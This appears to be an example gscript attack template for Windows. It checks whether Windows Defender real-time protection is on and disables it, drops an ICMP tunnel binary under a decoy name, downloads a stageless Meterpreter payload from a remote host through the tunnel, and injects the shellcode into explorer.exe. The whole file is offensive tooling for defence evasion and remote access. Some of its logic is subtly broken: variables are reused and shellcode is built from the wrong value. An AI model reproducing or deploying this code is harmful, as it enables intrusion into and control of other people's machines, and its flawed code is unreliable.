// Example gscript template
// Title: Vyrus Example!
// Author: Vyrus
// Purpose: Check if windows defender is running
//          If it is, dissable it
//          Drop / run ICMP tunnel
//          Download stageless meterpreter payload via HTTPS / ICMP
//          Inject meterpreter into explore.exe
//          Inject shellcode that waits for the gscript.exe process to end before deleating the binary from disk
// Gscript version: 1.0.0

//priority:130
//timeout:200

//go_import:github.com/gen0cide/gscript/x/windows as windows
//go_import:github.com/vyrus001/msflib as msflib

//import:/private/tmp/ptunnel.exe
//import:/private/tmp/cygwin1.dll
​
var ptun = "C:\\Windows\\Temp\\\doNotDeleteMe.exe";
var cygdll = "C:\\Windows\\Temp\\cygwin1.dll";
var ptunHost = "0.0.0.0";
var ptunPort = "1234";
​​
function Deploy() {
​
    // check if defender is on
    var wasDefenderOnWhenWeStarted = false;
    var cmdResult = G.exec.ExecuteCommand("powershell.exe", ["MpComputerStatus"]);
    if (cmdResult[4] != null) {;
        console.log(cmdResult[4].Error());
        return false;
    }
    var cmdLines = cmdResult[1].split('\n');
    for(var cmdLinesIndex = 0; cmdLinesIndex < cmdLines.length; cmdLinesIndex++) {
        if (cmdLines[cmdLinesIndex].includes("RealTimeProtectionEnabled")) {
            if (cmdLines[cmdLinesIndex].includes("True")) {
                wasDefenderOnWhenWeStarted = true;   
            }
        }
    }
    
    // turn defender off
    if (wasDefenderOnWhenWeStarted) {
        cmdResult = G.exec.ExecuteCommand("powershell.exe", ["Set-MpPreference", "-DisableRealtimeMonitoring", "$true"]); // this has to be done as admin in order to work
        if (cmdResult[4] != null) {
            console.log(cmdResult[4].Error());
            return false;
        }
    }
​
    // drop ptun
    console.log("Dropping the icmp tunnel binary...");
    var ptun2 = GetAssetAsBytes("ptunnel.exe");
    var error = G.file.WriteFileFromBytes(ptun, ptun2[0]);
    if (error != null) {
        console.log(error);
        return false;
    }
    var cygdll2 = GetAssetAsBytes("cygwin1.dll");
    error = G.file.WriteFileFromBytes(cygdll, cygdll2[0]);
    if (error != null) {
        console.log(error);
        return false;
    }
​
    // run ptun
    console.log("Starting icmp tunnel...")
    cmdResult = G.exec.ExecuteCommand("ptunnel.exe", ["-p", "127.0.0.1", "-lp", "31337", "-da", ptunHost, "-dp", ptunPort]);
    if (cmdResult[4] != null) {
        console.log(cmdResult[4].Error());
        return false;
    }

    // download meterp payload
    console.log("Retrieving Meterpreter...");
    var msfres = msflib.GetURL();
    var cmdResult = G.requests.GetURLAsBytes("http://127.0.0.1:31337"+msfres[1], true);
    if (cmdResult[4] != null) {
        console.log(cmdResult[4].Error());
        return false;
    }

    // get PID of explore.exe
    console.log("Looking up explorer.exe PID...");
    var cmdResult = G.exec.ExecuteCommand("powershell.exe", ["Get-Process", "explorer", "|", "select", "-expand", "id"]);
    if (cmdResult[4] != null) {
        console.log(cmdResult[4].Error());
        return false;
    }
    // inject meterpreter
    console.log("Injecting msf shellcode stager into explorer.exe...")
    var shellcode = [];
    for (var shellcodeByteIndex = 0; shellcodeByteIndex < cmdResult[1].length; ++shellcodeByteIndex) {
        shellcode = shellcode.concat(cmdResult[4].charCodeAt(shellcodeByteIndex));
    }
    cmdResult = windows.InjectShellcode(cmdResult[1], shellcode);
    if (cmdResult[4] != null) {
        console.log(cmdResult[4].Error());
        return false;
    }

    // turn defender on
    if (wasDefenderOnWhenWeStarted) {
        // this has to be done as admin in order to work
        cmdResult = G.exec.ExecuteCommand("Set-MpPreference", ["-DisableRealtimeMonitoring", "$false"]); 
        if (cmdResult[4] != null) {
            console.log(cmdResult[4].Error());
            return false;
        }
    } 
}
